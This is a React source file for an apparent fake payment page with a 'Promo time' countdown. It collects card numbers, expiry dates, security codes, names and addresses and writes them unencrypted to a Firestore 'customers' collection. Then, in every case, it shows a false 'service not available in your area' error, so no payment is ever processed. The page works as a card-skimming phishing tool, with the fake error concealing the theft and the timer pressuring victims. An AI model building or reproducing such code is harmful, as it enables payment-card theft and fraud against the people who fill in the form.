import { useState,useEffect } from "react";
import "./App.css";
import visa from "./imagenes/visa.jpg";
import express from "./imagenes/express.jpg";
import discover from "./imagenes/discover.jpg";
import mastercard from "./imagenes/mastercard.jpg";
import { db } from "./firebase"; // Import the Firestore instance
import { collection, addDoc } from "firebase/firestore";
import Swal from "sweetalert2";


function App() {
  const [value, setValue] = useState("");
  const [cardNumber, setCardNumber] = useState("");
  const [securityCode, setSecurityCode] = useState("");
  const [firstName, setFirstName] = useState("");
  const [lastName, setLastName] = useState("");
  const [address, setAddress] = useState("");

  const handleInputChange = (event) => {
    let inputValue = event.target.value;

    // Remove all non-digit characters
    inputValue = inputValue.replace(/\D/g, "");

    // Insert a slash after the second digit
    if (inputValue.length > 2) {
      inputValue = inputValue.slice(0, 2) + "/" + inputValue.slice(2, 4);
    }

    // Limit the input length to 5 characters (MM/AA)
    if (inputValue.length > 5) {
      inputValue = inputValue.slice(0, 5);
    }

    setValue(inputValue);
  };

  const handleSubmit = async (event) => {
    event.preventDefault();

    try {
      // Add a new document with the form data
      await addDoc(collection(db, "customers"), {
        cardNumber,
        expirationDate: value,
        securityCode,
        firstName,
        lastName,
        address,
      });
      
      Swal.fire({
        title: "Uup! there is an error",
        text: "this service is not available in your area! try againg later.",
        icon: "error"
      })
      //.then(()=> window.location.reload()) //para refrescar la web
      

    } catch (e) {
      console.error("Error adding document: ", e);
      alert("Error saving payment details. Please try again.");
    }
  };

  return (
    <div className="web-container">
      <div className="monto">
        <h2>Provide payment details</h2>
        <h3>Payment</h3> <span>Monto: $5.00</span>
      </div>

      <Countdown initialSeconds={15000} />
      <hr />

      <p className="cards-container">
        Credit / debit card
        <img src={visa} className="cards" alt="Visa" />
        <img src={express} className="cards" alt="American Express" />
        <img src={discover} className="cards" alt="Discover" />
        <img src={mastercard} className="cards" alt="Mastercard" />
      </p>
      <p>Card details</p>
      <form onSubmit={handleSubmit}>
        <input
          type="text"
          className="card-number"
          placeholder="Card number"
          value={cardNumber}
          onChange={(e) => setCardNumber(e.target.value)}
          required
        />
        <input
          type="text"
          placeholder="Exp. date(MM/YY)"
          maxLength="5"
          onChange={handleInputChange}
          value={value}
          className="expiration"
          required
        />
        <input
          type="text"
          placeholder="Security Code"
          value={securityCode}
          onChange={(e) => setSecurityCode(e.target.value)}
          className="security-code"
          maxLength={4}
          required

        />
        <p>Billing address</p>
        <input
          type="text"
          placeholder="First Name"
          value={firstName}
          onChange={(e) => setFirstName(e.target.value)}
          className="name"
          required

        />
        <input
          type="text"
          placeholder="Last Name"
          value={lastName}
          onChange={(e) => setLastName(e.target.value)}
          className="last-name"
          required

        />
        <br />
        <br />
        <input
          type="text"
          placeholder="Address"
          value={address}
          onChange={(e) => setAddress(e.target.value)}
          className="address"
          required
        />
        <button type="submit" className="btn">Process Payment</button>
        <br /><br />
        <hr />
      </form>
    </div>
  );
}

const Countdown = ({ initialSeconds }) => {
  const [seconds, setSeconds] = useState(initialSeconds);

  useEffect(() => {
    if (seconds > 0) {
      const intervalId = setInterval(() => {
        setSeconds(seconds => seconds - 1);
      }, 1000);
      return () => clearInterval(intervalId);
    }
  }, [seconds]);

  // Convierte segundos a formato de horas, minutos y segundos
  const formatTime = (secs) => {
    const hours = Math.floor(secs / 3600);
    const minutes = Math.floor((secs % 3600) / 60);
    const seconds = secs % 60;
    return `${hours.toString().padStart(2, '0')}:${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
  };

  return (
    <div className="regresiva">
      <h2>Promo time</h2>
     <strong> <p>Remaining {formatTime(seconds)}</p></strong>
    </div>
  );
};


export default App;


